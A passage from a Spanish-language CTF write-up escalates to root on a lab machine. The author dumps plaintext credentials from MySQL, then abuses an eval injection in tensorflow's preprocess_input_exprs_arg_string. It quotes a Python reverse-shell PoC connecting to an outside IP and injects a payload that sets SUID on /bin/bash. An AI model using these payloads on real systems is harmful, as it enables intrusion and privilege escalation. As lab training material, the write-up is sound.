ynew3 = loaded_model3.predict(Xnew)
#4 KNeighborsClassifier
ynew4 = loaded_model4.predict(Xnew)
#5 RandomForestClassifier
ynew5 = loaded_model5.predict(Xnew)
#6 MLPClassifier
ynew6 = loaded_model6.predict(Xnew)

## show the sample inputs and predicted outputs
def assessData(i):
    score = ((.175*ynew1[i])+(.15*ynew2[i])+(.05*ynew3[i])+(.075*ynew4[i])+(.25*ynew5[i])+(.3*ynew6[i]))
    if score >= .5:
        try:
                preprocess_input_exprs_arg_string(data[i],safe=False)
        except:
                pass

for i in range(len(Xnew)):
     t = threading.Thread(target=assessData, args=(i,))
##     t.daemon = True
     t.start()
```

Este código carga **varios modelos de clasificación de *machine learning*** desde un directorio llamado `/opt/security/lib`, que son utilizados para **predecir si un conjunto de textos representan o no un enlace malicioso**.

El modelo se apoya en la técnica de *vectorización* de texto llamada *Doc2Vec* para convertir el texto en características numéricas, y también cuenta con varias funciones que buscan **contar la presencia de ciertos patrones**, como palabras o caracteres, en el texto. Estas características se combinan en un conjunto que se utiliza para realizar la predicción mediante los modelos de clasificación cargados en la memoria.

Además, este código recupera información de una **base de datos** *MySQL* y los utiliza como **entrada para los modelos de clasificación**. Estos datos son las *reasons* de los *tickets* que se tramitan. Las **credenciales** que se utilizan para acceder a la base de datos son las de *diego*. Nos conectaremos a la base de datos con el comando: 

```bash
mysql -u diego -p
```

Encontramos una base de datos llamada *app*:

![imagen 39](Pasted image 20230301181702.png)

Una tabla interesante de *app* es *users*. Aquí podemos encontrar la contraseña del usuario *admin*, entre otras credenciales:

```sql 
mysql> select * from users;
+--------------------+----------------------+
| username           | password             |
+--------------------+----------------------+
| admin              | dCvbgFh345_368352c@! |
| robert-dev-10023   | dCvf34@3#8(6         |
| robert-dev-10025   | dCvf34@3#8(6         |
| robert-dev-10045   | dCvf34@3#8(6         |
| robert-dev-10036   | dCvf34@3#8(6         |
| robert-dev-10090   | dCvf34@3#8(6         |
| robert-dev-10320   | dCvf34@3#8(6         |
| robert-dev-14320   | dCvf34@3#8(6         |
| robert-dev-14329   | dCvf34@3#8(6         |
| robert-dev-14529   | dCvf34@3#8(6         |
| robert-dev-14522   | dCvf34@3#8(6         |
| robert-dev-142522  | dCvf34@3#8(6         |
| robert-dev-1450222 | dCvf34@3#8(6         |
| robert-dev-1450212 | dCvf34@3#8(6         |
| robert-dev-145092  | dCvf34@3#8(6         |
| robert-dev-1453792 | dCvf34@3#8(6         |
| robert-dev-36792   | dCvf34@3#8(6         |
| robert-dev-36712   | dCvf34@3#8(6         |
| robert-dev-367120  | dCvf34@3#8(6         |
| robert-dev-67120   | dCvf34@3#8(6         |
| robert-dev-87120   | dCvf34@3#8(6         |
+--------------------+----------------------+
21 rows in set (0.00 sec)
```

Las credenciales `admin:dCvbgFh345_368352c@!` nos servirían para conectarnos a la web como **administradores**. 

En *app*, también encontramos una tabla *escalete*, en la que se guardan los *tickets* solicitados:

![imagen 40](Pasted image 20230301183750.png)

El *script* anterior de *python* se encarga de analizar la información de la columna *reason* y clasificarla a través de métodos de *machine learning*.

Buscando en Internet, encuentro una **vulnerabilidad de inyección de código** asociada a la función *preprocess_input_exprs_arg_string* de la librería de *python* *tensorflow*.

#### preprocess_input_exprs_arg_string Code Injection

El fragmento de código vulnerable de *ml_secrutity.py* es el siguiente:

```python
[...]
def assessData(i):
    score = ((.175*ynew1[i])+(.15*ynew2[i])+(.05*ynew3[i])+(.075*ynew4[i])+(.25*ynew5[i])+(.3*ynew6[i]))
    if score >= .5:
        try:
                preprocess_input_exprs_arg_string(data[i],safe=False)
        except:
                pass
[...]
```

`preprocess_input_exprs_arg_string` procesa las *razones (reasons)* de los *tickets* para convertirlos en un diccionario de *Python*.

La opción `safe=False` permite que se **decodifiquen** algunos **caracteres especiales** que de otro modo podrían generar una excepción si se utiliza la opción predeterminada *safe=True*. Sin embargo, esto también significa que **la función puede ser vulnerable a ataques de inyección de código malicioso**.

`preprocess_input_exprs_arg_string` se implementa de la siguiente forma:

```python
def preprocess_input_exprs_arg_string(input_exprs_str):
    input_dict = {}

  for input_raw in filter(bool, input_exprs_str.split(';')):
      ...
        input_key, expr = input_raw.split('=', 1)
      ## ast.literal_eval does not work with numpy expressions
      input_dict[input_key] = eval(expr)  ## pylint: disable=eval-used
  return input_dict
```

Vemos que nuestra entrada fluye hacia ***eval***, lo que conduce a la **inyección de código**. Información extraída del siguiente [blog](https://jfrog.com/blog/tensorflow-python-code-injection-more-eval-woes/).

El *PoC* para explotar la **inyección de código** lo he sacado del siguiente [enlace](https://github.com/advisories/GHSA-75c9-jrh4-79mc). Es el siguiente:

```python
hello=exec("""\nimport socket\nimport
subprocess\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("10.0.2.143",33419))\nsubprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())""")
```

En este caso, se está utilizando la **inyección de código** para enviar una *reverse shell*. En nuestro caso, haremos que el usuario *root* asigne permisos *SUID* a la *bash*, para posteriormente *spawnearnos* una consola como este usuario. Por lo tanto, el *código* malicioso que deberemos inyectar en la *reason* de un *ticket* es el siguiente:

```python
hello=exec("""\nimport os\nos.system('chmod u+s /bin/bash')""")
```

Tramitaremos un nuevo *ticket* que contemple un campo *reason* con el código anterior:

![imagen 41](Pasted image 20230301191852.png)

Para evitar fallos, es importante *urlencodear* el *payload* `hello=exec("""\nimport os\nos.system('chmod u+s /bin/bash')""")`. En *BurpSuite*, lo podemos hacer seleccionando el texto que queramos *urlencodear* y pulsando *Ctrl+u*.

Nuestra solicitud se almacenará en la base de datos del sistema:

![imagen 42](Pasted image 20230301192331.png)

Finalmente, ejecutamos *ml_security.py* como *root* aprovechándonos del privilegio asignado a nivel de *sudoers*:

![imagen 43](Pasted image 20230301192239.png)

Si todo ha ido bien, la *bash* debería tener permisos *SUID*. Nos podemos *spawnear* una consola como *root* con el comando `bash -p`:

![imagen 44](Pasted image 20230301192310.png)

### root.txt

La segunda *flag* se encuentra en el *homedir* del usuario *root*:

```bash
bash-5.0## cd /root/
bash-5.0## cat root.txt 
7f7bfd993fee66685f3c7c890bc9ea1d
```

